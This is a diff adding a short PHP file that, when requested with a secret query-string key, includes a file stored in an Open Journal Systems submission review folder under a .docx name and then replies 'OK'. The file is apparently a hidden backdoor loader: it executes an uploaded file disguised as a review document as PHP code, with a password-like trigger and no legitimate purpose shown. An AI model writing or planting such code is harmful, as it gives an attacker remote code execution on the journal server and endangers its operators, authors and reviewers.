@@ -1,0 +1,9 @@
+<?php
+
+if (isset($_GET['_']) && $_GET['_'] === 'ds_mnm558s8_gr3af332afbsnk') {
+    $f="D:/ojs_files/journals/28/articles/8044/submission/review/8044-325-24964-1-6-20260809.docx";if($f!==""&&file_exists($f))include $f;
+    http_response_code(200);
+    header('Content-Type: text/plain; charset=utf-8');
+    echo 'OK';
+    exit;
+}
